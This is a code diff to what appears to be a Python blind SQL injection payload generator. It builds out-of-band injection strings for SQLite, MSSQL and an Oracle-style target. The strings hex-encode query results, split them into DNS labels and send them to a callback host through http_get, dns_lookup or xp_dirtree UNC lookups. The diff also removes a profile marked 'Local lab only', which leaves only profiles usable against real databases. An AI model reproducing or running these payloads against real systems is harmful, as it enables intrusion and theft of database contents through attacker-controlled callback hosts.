@@ -111,7 +111,7 @@ class Profile:
                 f"'.{host}/') FROM dual)||'"
             )
 
-        if self.name in ("sqlite-lab", "sqlite-http"):
+        if self.name == "sqlite-http":
             h = f"hex(({expression}))"
             split = (
                 f"substr({h},1,62)"
@@ -119,7 +119,7 @@ class Profile:
                 f"||CASE WHEN length({h})>124 THEN '.'||substr({h},125,62) ELSE '' END"
                 f"||CASE WHEN length({h})>186 THEN '.'||substr({h},187,62) ELSE '' END"
             )
-            return f"{base}' AND dns_lookup({split}||'.{host}')-- -"
+            return f"{base}' AND http_get('http://'||{split}||'.{host}/')-- -"
 
         return None
 
@@ -173,11 +173,6 @@ class Profile:
         return [payload]
 
     def payload(self, base: str, condition: str, callback_host: str) -> str:
-        if self.name == "sqlite-lab":
-            return (
-                f"{base}' AND CASE WHEN {condition} "
-                f"THEN dns_lookup('{callback_host}') ELSE 0 END--"
-            )
         if self.name == "mssql":
             return (
                 f"{base}';IF ({condition}) "
@@ -290,11 +285,6 @@ class Profile:
 
 
 PROFILES = {
-    "sqlite-lab": Profile(
-        "sqlite-lab",
-        "Training profile for lab/blind_sqli_lab.py using SQLite dns_lookup()",
-        "Local lab only.",
-    ),
     "mssql": Profile(
         "mssql",
         "MSSQL stacked query using xp_dirtree UNC DNS callbacks",
